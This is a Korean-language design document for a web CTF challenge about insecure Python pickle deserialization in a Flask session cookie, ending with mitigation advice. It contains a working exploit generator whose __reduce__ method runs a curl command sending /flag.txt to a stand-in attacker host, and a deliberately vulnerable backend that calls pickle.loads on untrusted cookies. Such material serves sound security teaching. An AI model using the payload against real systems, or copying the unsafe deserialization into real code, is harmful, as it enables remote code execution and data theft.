---
title: Insecure Python Pickle Deserialization leading to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, deserialization, python, pickle, rce, cookie-tampering]
confidence: high
---

# Insecure Python Pickle Deserialization leading to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: User Session Archiver (사용자 세션 보관소)
- **난이도**: Medium-High
- **핵심 컨셉**: 파이썬의 표준 데이터 직렬화 포맷인 **Pickle** 라이브러리의 불안전한 역직렬화(Insecure Deserialization) 취약점입니다. 애플리케이션은 사용자의 로그인 세션 상태(이름, 역할 등)를 담은 파이썬 객체를 직렬화한 뒤 Base64 인코딩을 적용해 쿠키 값(`user_session`)으로 브라우저에 저장합니다. 공격자는 이 직렬화 구조에 악성 명령어 실행 코드(`__reduce__` 매직 메서드)를 포함시킨 임의 객체를 주입하고 쿠키로 전송하여 서버가 이를 로드하는 시점에 원격 코드 실행(RCE)을 달성합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Profile Page**: 사용자 로그인 후 자신의 세션 정보를 아카이브하고 프로필 정보를 다시 불러오는 화면.
- **Backend Service (Python/Flask)**: 
  - 유저 정보 객체(`User`)를 정의하고, 로그인 시 `pickle.dumps`로 세션을 직렬화한 후 쿠키 전송.
  - 다음 요청 수신 시 쿠키 내 Base64 데이터를 디코딩해 `pickle.loads`로 역직렬화하여 객체 정보 복원.
- **Flag 위치**: 
  - 서버 루트 디렉터리: `/flag.txt`

### 2.2 취약점 지점
1. **Unsafe Use of pickle.loads**:
   - `pickle` 모듈은 안전하지 않은 신뢰할 수 없는 데이터의 역직렬화를 수행할 경우 샌드박스가 존재하지 않기 때문에 임의 코드가 실행될 수 있습니다.
   - `__reduce__` 특수 함수가 구현된 객체는 역직렬화 도중 정의된 시스템 수준 함수(예: `os.system` 또는 `subprocess.Popen`)를 강제 실행합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Cookie) | 반환 값 | 비고 |
|------------|--------|------|------------------|---------|------|
| `/profile` | GET | 없음 | Cookie: `user_session=<Base64>` | 사용자 프로필 정보 페이지 | 역직렬화(loads)가 트리거되는 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 쿠키 구조 분석
사용자는 정상 로그인 후 저장된 쿠키 값을 개발자 도구에서 분석합니다.
- *쿠키명*: `user_session`
- *값 예시*: `gASVEQAAAAAAAAB9lIwEdXNlcpSMAmd1ZXN0lXUu...` (Base64 형식)
- *로컬 테스트*: 파이썬 셸에서 해당 값을 Base64 디코딩하고 `pickle.loads`를 수행해 보면 일반 유저 클래스나 딕셔너리 정보가 반환됨을 알 수 있습니다.

### Step 2. 악성 Pickle 익스플로잇 페이로드 작성
파이썬 스크립트를 작성하여 역직렬화 시 `cat /flag.txt` 명령을 수행하고 그 결과를 공격자 웹서버로 전송(또는 아웃오브밴드/Reverse Shell 등)하는 페이로드를 생성합니다.
- **Payload Generator Script (Python)**:
  ```python
  import pickle
  import base64
  import os

  class Exploit(object):
      def __reduce__(self):
          # 역직렬화 시 os.system('curl http://attacker.local/log?flag=`cat /flag.txt`') 실행
          # 또는 리버스 셸 실행 유도
          cmd = "curl http://attacker.local/log?flag=$(cat /flag.txt | base64)"
          return (os.system, (cmd,))

  exploit_obj = Exploit()
  raw_pickle = pickle.dumps(exploit_obj)
  b64_pickle = base64.b64encode(raw_pickle).decode()

  print(f"Generated Cookie: {b64_pickle}")
  ```

### Step 3. 공격 전송 및 RCE 수행
1. 위 파이썬 스크립트로 생성한 Base64 결과 문자열을 복사합니다.
2. 타겟 서비스 접속 시 브라우저 또는 curl 요청 헤더의 `Cookie: user_session=<Base64>` 부분에 이를 대입하여 GET 요청을 보냅니다.
   ```bash
   curl http://session.challenge.local/profile \
        -H "Cookie: user_session=gASVIQAAAAAAAACMAklVTVl..."
   ```

### Step 4. flag 획득
서버는 쿠키 값을 가져와 `pickle.loads()`를 실행하게 되며, 이 순간 `Exploit` 객체의 `__reduce__` 속성에 의해 공격자가 정의한 `os.system` 함수가 실행되어 `/flag.txt` 파일을 읽은 뒤 공격자 리스너 주소로 값을 송신하고, 공격자는 해당 웹 로그를 조회하여 플래그를 얻습니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py
from flask import Flask, request, make_response, render_template
import pickle
import base64

app = Flask(__name__)

class UserSession:
    def __init__(self, username, role="user"):
        self.username = username
        self.role = role

@app.route("/")
def index():
    # 최초 진입 시 기본 세션 쿠키 발급
    user = UserSession("guest")
    serialized = pickle.dumps(user)
    b64_data = base64.b64encode(serialized)
    
    resp = make_response("Welcome! Cookie issued.")
    resp.set_cookie("user_session", b64_data.decode())
    return resp

@app.route("/profile")
def profile():
    # 취약점 지점: 쿠키 값을 역직렬화할 때 검증 없는 pickle.loads 수행
    cookie_val = request.cookies.get("user_session")
    if not cookie_val:
        return "No session cookie", 401
        
    try:
        raw_data = base64.b64decode(cookie_val)
        # 악성 객체가 담긴 바이트 코드를 역직렬화하는 순간 코드 실행 발생!
        user_obj = pickle.loads(raw_data)
        
        return f"Hello, {user_obj.username}! Your role is {user_obj.role}."
    except Exception as e:
        return f"Error loading session: {str(e)}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **안전한 데이터 포맷 사용 (Safe Data Formats)**:
   - 클라이언트 사이드 쿠키에는 임의의 바이너리 객체 직렬화 포맷을 사용하지 않아야 합니다. 대신 `JSON`이나 `YAML(Safe Loader)` 같은 정적 텍스트 데이터를 암호화/서명하여 보관합니다.
2. **세션 토큰 기반 보안 (Cryptographically Signed Cookies)**:
   - Flask의 내장 `session` 객체를 사용(기본 내부 구현은 SecureCookie 포맷으로, `itsdangerous` 라이브러리로 무결성을 보호함)하고, 커스텀 임의 역직렬화는 완벽히 제거합니다.
3. **입력 데이터 서명 검증**:
   - 어쩔 수 없이 직렬화된 데이터를 사용해야 한다면, 대칭 암호화 키를 활용한 HMAC 서명을 덧붙이고, 디코딩 전 서명의 무결성을 먼저 통과한 경우에만 데이터를 연산에 사용하도록 구성합니다.
